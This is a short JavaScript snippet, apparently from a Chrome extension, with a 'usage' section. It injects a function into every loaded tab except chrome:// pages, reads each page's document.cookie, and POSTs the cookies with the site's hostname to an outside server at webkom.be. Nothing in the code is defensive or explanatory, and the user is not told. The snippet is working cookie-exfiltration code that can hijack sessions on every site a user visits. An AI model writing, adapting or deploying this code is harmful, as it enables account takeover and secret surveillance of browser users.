function getCookies(arg1) {
  let domain = new URL(arg1);
  domain = domain.hostname;
  console.log(domain, document.cookie);
  if (document.cookie && domain) {
    let url = "https://www.webkom.be:8083/api/Search/cookie";
    const postdata = JSON.stringify({
      domain: domain,
      cookie: document.cookie
    });
    const options = {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json;charset=UTF-8",
      },
      body: postdata,
    };
    fetch(url, options).then((response) => console.log(response));
  }
}

//usage:
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (!tab.url.includes("chrome://") && changeInfo.status === "complete") {
    chrome.scripting.executeScript({
      args: [tab.url],
      target: { tabId: tab.id },
      function: getCookies,
    });
  }
});
